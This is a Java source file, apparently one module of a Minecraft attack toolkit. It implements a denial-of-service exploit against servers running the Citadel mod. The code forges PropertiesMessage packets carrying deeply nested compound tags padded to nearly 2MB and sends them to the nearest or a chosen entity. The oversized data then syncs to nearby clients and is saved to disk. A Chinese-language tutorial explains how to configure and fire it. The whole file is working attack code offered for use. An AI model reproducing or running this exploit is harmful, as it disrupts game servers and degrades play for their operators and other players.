package com.redblue.red.modules.citadel;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CITADEL-02 + CITADEL-07: NBT bloat DoS via PropertiesMessage.
 *
 * Sends near-max-size CompoundTags (~2MB each) to target entities.
 * The data persists in SynchedEntityData, syncs to all nearby clients,
 * and saves to disk. Combined with no rate limiting (CITADEL-07).
 *
 * Wire format: same as CTD01 (discriminator 0).
 */
public class CTD02_NbtBloatDoS implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("citadel", "main_channel");
    private static final int IDX_PROPERTIES_MESSAGE = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBool("confirm_danger",
                "⚠ 确认：可能影响服务器性能", false),
        ConfigParam.ofInt("nbt_depth", "NBT嵌套深度", 64, 1, 256)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("string_pad_kb", "填充大小(KB)", 512, 1, 1900)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofInt("packet_count", "发包数量", 1, 1, 10)
                .visibleWhen("confirm_danger", "true"),
        ConfigParam.ofEntity("target_entity_id", "目标实体")
                .visibleWhen("confirm_danger", "true")
    );

    @Override public String id() { return "ctd02_nbt_bloat_dos"; }
    @Override public String name() { return "NBT膨胀攻击"; }
    @Override public String description() {
        return "向实体注入超大NBT数据拖慢服务器";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 勾选「⚠ 确认」开关，未确认时模块不会执行任何操作\n"
            + "2. 设置「NBT嵌套深度」和「填充大小(KB)」控制数据包体积\n"
            + "3. 可指定「目标实体」，留空则自动选择最近的生物实体\n"
            + "4. 设置「发包数量」后点击「执行」\n\n"
            + "[参数说明]\n"
            + "- confirm_danger: 安全确认开关，必须勾选后才能执行\n"
            + "- nbt_depth: NBT嵌套深度，范围1~256，默认64\n"
            + "- string_pad_kb: 填充字符串大小(KB)，范围1~1900，默认512\n"
            + "- packet_count: 发送的数据包数量，范围1~10，默认1\n"
            + "- target_entity_id: 目标实体，留空(值为0)时自动选择最近的生物\n\n"
            + "[注意事项]\n"
            + "- 需要服务器安装了Citadel模组才可使用\n"
            + "- 填充大小不要超过1900KB，否则可能超出协议限制导致发送失败\n"
            + "- 未指定目标且附近无生物时不会执行任何操作";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("citadel");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        boolean confirmed = getParam("confirm_danger")
                .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        int depth = getParam("nbt_depth").map(ConfigParam::getInt).orElse(64);
        int padKb = getParam("string_pad_kb").map(ConfigParam::getInt).orElse(512);
        int count = getParam("packet_count").map(ConfigParam::getInt).orElse(1);
        int targetId = getParam("target_entity_id")
                .map(ConfigParam::getInt).orElse(0);

        // If target_entity_id is 0, use nearest LivingEntity
        if (targetId == 0) {
            targetId = findNearestLivingId(mc);
            if (targetId == 0) return;
        }

        CompoundTag payload = buildBloatedTag(depth, padKb);

        for (int i = 0; i < count; i++) {
            sendPropertiesMessage("CitadelTagUpdate", payload, targetId);
        }
    }

    private int findNearestLivingId(Minecraft mc) {
        double best = Double.MAX_VALUE;
        int bestId = 0;
        for (Entity e : mc.level.entitiesForRendering()) {
            if (e == mc.player) continue;
            if (!(e instanceof LivingEntity)) continue;
            double d = mc.player.distanceTo(e);
            if (d < best) {
                best = d;
                bestId = e.getId();
            }
        }
        return bestId;
    }

    /**
     * Build a deeply nested CompoundTag with string padding.
     * Stays under MC's 2MB readNbt limit but maximizes stored size.
     */
    private CompoundTag buildBloatedTag(int depth, int padKb) {
        // Create padding string
        StringBuilder sb = new StringBuilder(padKb * 1024);
        for (int i = 0; i < padKb * 1024; i++) {
            sb.append('A');
        }
        String padding = sb.toString();

        // Build nested structure
        CompoundTag root = new CompoundTag();
        CompoundTag current = root;
        for (int i = 0; i < depth - 1; i++) {
            CompoundTag child = new CompoundTag();
            current.put("n" + i, child);
            current = child;
        }
        // Put padding at the deepest level
        current.putString("pad", padding);
        return root;
    }

    private void sendPropertiesMessage(
            String propertyId, CompoundTag compound, int entityId) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_PROPERTIES_MESSAGE);
            writeUTF8String(buf, propertyId);
            buf.writeNbt(compound);
            buf.writeInt(entityId);
        });
    }

    private static void writeUTF8String(FriendlyByteBuf buf, String s) {
        byte[] bytes = s.getBytes(java.nio.charset.StandardCharsets.UTF_8);
        writeVarInt(buf, bytes.length, 2);
        buf.writeBytes(bytes);
    }

    private static void writeVarInt(FriendlyByteBuf buf, int value, int maxBytes) {
        while ((value & -128) != 0) {
            buf.writeByte(value & 127 | 128);
            value >>>= 7;
        }
        buf.writeByte(value);
    }
}
